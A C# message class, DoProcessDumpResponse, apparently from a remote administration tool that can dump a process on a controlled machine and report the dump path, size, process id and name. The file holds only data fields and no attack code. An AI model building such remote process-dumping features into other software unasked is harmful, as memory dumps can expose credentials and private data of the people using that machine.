using MessagePack;
using Pulsar.Common.Messages.Other;

namespace Pulsar.Common.Messages.Administration.TaskManager
{
    [MessagePackObject]
    public class DoProcessDumpResponse : IMessage
    {
        [Key(1)]
        public bool Result { get; set; }

        [Key(2)]
        public string DumpPath { get; set; }

        [Key(3)]
        public long Length { get; set; }

        [Key(4)]
        public int Pid { get; set; }

        [Key(5)]
        public string ProcessName { get; set; }

        [Key(6)]
        public string FailureReason { get; set; }

        [Key(7)]
        public long UnixTime { get; set; }
    }
}
